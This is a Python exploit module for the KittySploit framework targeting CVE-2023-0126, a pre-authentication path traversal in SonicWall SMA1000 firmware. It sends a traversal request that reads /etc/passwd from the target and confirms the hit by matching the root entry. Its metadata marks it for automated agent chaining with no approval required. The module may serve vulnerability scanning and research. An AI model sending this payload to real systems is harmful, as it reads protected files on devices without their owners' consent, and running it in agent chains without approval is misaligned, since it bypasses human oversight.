#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pre-authentication path traversal vulnerability in SMA1000 firmware version 12."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SonicWall SMA1000 LFI Detection',
        'description': 'Pre-authentication path traversal vulnerability in SMA1000 firmware version 12.4.2, which allows an unauthenticated attacker to access arbitrary files and directories stored outside the web root directory.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'sonicwall', 'lfi', 'sma1000', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-0126',
            'https://github.com/advisories/GHSA-mr28-27qx-phg3',
            'https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0001',
            'https://github.com/Gerxnox/One-Liner-Collections',
            'https://github.com/thecybertix/One-Liner-Collections',
        ],
        'cve': 'CVE-2023-0126',
    }

    def run(self):
        r = self.http_request(method="GET", path='/images//////////////////../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('content/unknown',)
        body_regexes = ('root:[x*]:0:0',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SonicWall SMA1000 LFI detected",
                path='/images//////////////////../../../../../../../../etc/passwd',
            )
            return True
        return False

